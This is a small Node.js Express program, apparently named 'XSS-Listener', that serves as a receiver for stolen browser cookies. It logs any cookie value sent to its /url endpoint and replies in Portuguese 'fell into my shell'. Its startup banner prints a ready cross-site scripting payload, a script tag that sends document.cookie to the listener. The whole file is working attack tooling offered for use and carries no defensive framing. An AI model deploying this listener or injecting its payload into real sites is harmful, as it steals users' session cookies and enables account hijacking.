var express = require("express");
var app = express();
const port = 3000
app.listen(port, () => {
  app.get("/url", (req, res, next) => {
	console.log(`Received -> ${req.query.cookie}`);
    res.json(["Caiu na minha shell"]);
  });

  console.log(`                                                                                                                                                                                                                         
  ██╗  ██╗███████╗███████╗      ██╗     ██╗███████╗████████╗███████╗███╗   ██╗███████╗██████╗ 
  ╚██╗██╔╝██╔════╝██╔════╝      ██║     ██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔══██╗
   ╚███╔╝ ███████╗███████╗█████╗██║     ██║███████╗   ██║   █████╗  ██╔██╗ ██║█████╗  ██████╔╝
   ██╔██╗ ╚════██║╚════██║╚════╝██║     ██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗
  ██╔╝ ██╗███████║███████║      ███████╗██║███████║   ██║   ███████╗██║ ╚████║███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚══════╝      ╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
  Made by Kiltzx -> github.com/kiltzx
  
  Server running on port -> ${port}

  URL to XSS-Infect -> http://localhost:${port}/url
  Param -> cookie
  Vuln with -> <script>$.get('http://localhost:3000/url?', { cookie: document.cookie})</script>
  `);
}); 